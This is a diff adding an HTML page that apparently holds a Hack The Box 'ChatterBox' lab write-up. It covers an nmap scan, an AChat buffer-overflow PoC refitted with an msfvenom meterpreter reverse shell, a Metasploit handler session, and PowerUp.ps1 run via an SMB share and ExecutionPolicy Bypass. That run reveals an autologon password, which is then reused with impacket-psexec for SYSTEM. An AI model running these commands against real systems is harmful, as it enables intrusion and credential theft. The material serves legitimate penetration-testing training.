@@ -1,0 +1,191 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB ChatterBox</h1>
+    <p class="text">Difficulty : Medium | UserDifficulty : 3.8</p>
+    <h2 class="subtitle">Enumeration</h2>
+
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;Target_IP&gt; --min-rate=2000</u>
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+9255/tcp  open  http         AChat chat system httpd
+|_http-server-header: AChat
+|_http-title: Site doesn't have a title.
+9256/tcp  open  achat        AChat chat system
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC</code></pre></div>
+
+<p class="text">There is an uncommon application on port 9256, named <u>achat</u>. It's not rare case where the uncommon application is vulnerable. Therefore, I will google it with keyword 'vulnerability'.</p>
+
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">I found <a href="https://www.exploit-db.com/exploits/36025">this poc</a> on exploit-db. However, this poc uses payload which opens calculator interestingly. Therefore, we need to change it into more usable one.</p>
+
+
+<p class="text">As it prepared almost all options for us, for instance, -b, -e, and -a, we can use this code with only replacing payload.</p>
+
+<div class="code-box"><pre><code> msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.16.40 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python</code></pre></div>
+
+<p class="text">And then, replace default paylaod with generated one. Also change this line <u>server_address = ('192.168.91.130', 9256)</u> into target ip.</p>
+
+<p class="text">Then, I will run it.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ <u>msfconsole</u>
+Metasploit tip: Writing a custom module? After editing your module, why not try 
+the reload command
+                                                  
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                 
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                 
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]                                                 
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]                                                 
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]                                                 
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]                                                 
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                 
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                 
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                 
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                 
+                                                                
+
+       =[ metasploit v6.4.50-dev                          ]
++ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
++ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > <u>use exploit/multi/handler</u>
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > <u>set PAYLOAD windows/meterpreter/reverse_tcp</u>
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > <u>set LHOST 10.10.16.40</u>
+LHOST => 10.10.16.40
+msf6 exploit(multi/handler) ><u> set ExitOnSession false</u>
+ExitOnSession => false
+msf6 exploit(multi/handler) > <u>set AutoRunScript post/windows/manage/migrate</u>
+AutoRunScript => post/windows/manage/migrate
+msf6 exploit(multi/handler) > <u>exploit -j -z</u>
+
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.10.16.40:4444 
+[*] Sending stage (177734 bytes) to 10.129.38.169
+[*] Session ID 1 (10.10.16.40:4444 -> 10.129.38.169:49171) processing AutoRunScript 'post/windows/manage/migrate'
+[*] Running module against CHATTERBOX
+[*] Current server process: notepad.exe (3436)
+[*] Spawning notepad.exe process to migrate into
+[*] Spoofing PPID 0
+[*] Migrating into 3764
+[+] Successfully migrated into process 3764
+[*] Meterpreter session 1 opened (10.10.16.40:4444 -> 10.129.38.169:49171) at 2025-10-16 07:16:32 -0400
+id
+[*] exec: id
+
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),107(bluetooth),115(scanner),126(lpadmin),134(wireshark),136(kaboxer),137(vboxsf)
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type             Information      Connection
+  --  ----  ----             -----------      ----------
+  1         meterpreter x86  CHATTERBOX\Alfr  10.10.16.40:4444
+            /windows         ed @ CHATTERBOX   -> 10.129.38.16
+                                              9:49171 (10.129.
+                                              38.169)</code></pre></div>
+
+<p class="text">Then, we can connect to the target machine. You can find user flag on <u>C:\Users\Alfred\Desktop</u></p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">I wanted to use <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp.ps1</a> for finding vector for privilege escalation, however, when I launched powershell, command line freezed. So, I will use it with <u>Load and Run</u> technique. </p>
+<p class="text">First, we need to install PowerUp.ps1 to the target machine. For that, I will use impacket-smbserver.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-smbserver share . -smb2support -username a -password a <u class="green">On a dir you installed PowerUp.ps1</u>
+
+
+C:\ProgramData> net use \\10.10.16.40 /user:a a
+C:\ProgramData> copy \\10.10.16.40\share\PowerUp.ps1</code></pre></div>
+
+<p class="text">Then, let's use it.</p>
+
+<div class="code-box"><pre><code>C:\ProgramData> powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module .\PowerUp.ps1; Invoke-AllChecks | Out-File C:\Users\Public\powerup-checks.txt -Encoding ASCII"</code></pre></div>
+<p class="text">Though the command line doesn't response, you can leave it for a while and press <u>Ctrl+c</u>, then create new shell with meterpreter.</p>
+
+<div class="code-box"><pre><code>C:\Users\Public>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 502F-F304
+
+ Directory of C:\Users\Public
+
+10/16/2025  12:33 PM    &lt;DIR>          .
+10/16/2025  12:33 PM    &lt;DIR>          ..
+07/14/2009  12:53 AM    &lt;DIR>          Documents
+07/14/2009  12:41 AM    &lt;DIR>          Downloads
+07/14/2009  12:41 AM    &lt;DIR>          Music
+07/14/2009  12:41 AM    &lt;IR>          Pictures
+10/16/2025  12:33 PM               358 powerup-checks.txt
+04/11/2011  10:21 PM    &lt;DIR>          Recorded TV
+07/14/2009  12:41 AM    &lt;IR>          Videos
+               1 File(s)            358 bytes
+               8 Dir(s)   3,347,320,832 bytes free</code></pre></div>
+
+<p class="text">We can see there is powerup-chekcs.txt, which is output of PowerUp.ps1. </p>
+
+
+<div class="code-box"><pre><code>C:\Users\Public>type powerup-checks.txt
+type powerup-checks.txt
+
+
+DefaultDomainName    : 
+DefaultUserName      : Alfred
+DefaultPassword      : Welcome1!
+AltDefaultDomainName : 
+AltDefaultUserName   : 
+AltDefaultPassword   : 
+Check                : Registry Autologons
+
+UnattendPath : C:\Windows\Panther\Unattend.xml
+Name         : C:\Windows\Panther\Unattend.xml
+Check        : Unattended Install Files</code></pre></div>
+
+
+<p class="text">We may be able to use this password for Admin user because it's not rare case where user password is set as admin password for practical reason. Let's try it.</p>
+
+
+<div class="code-box"><pre><code>└─$ impacket-psexec Administrator:'Welcome1!'@10.129.38.169
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.38.169.....
+[*] Found writable share ADMIN$
+[*] Uploading file qFadoJYt.exe
+[*] Opening SVCManager on 10.129.38.169.....
+[*] Creating service OtWZ on 10.129.38.169.....
+[*] Starting service OtWZ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system</code></pre></div>
+<p class="text">Fortunately, Administrator passoword uses the same password with alfred, and we successfully logon to Administrator.</p>
+<p class="text">You can find root flag on <u>C:\Users\Administrator\Desktop</u>.</p>
+
+</body>
+</html>
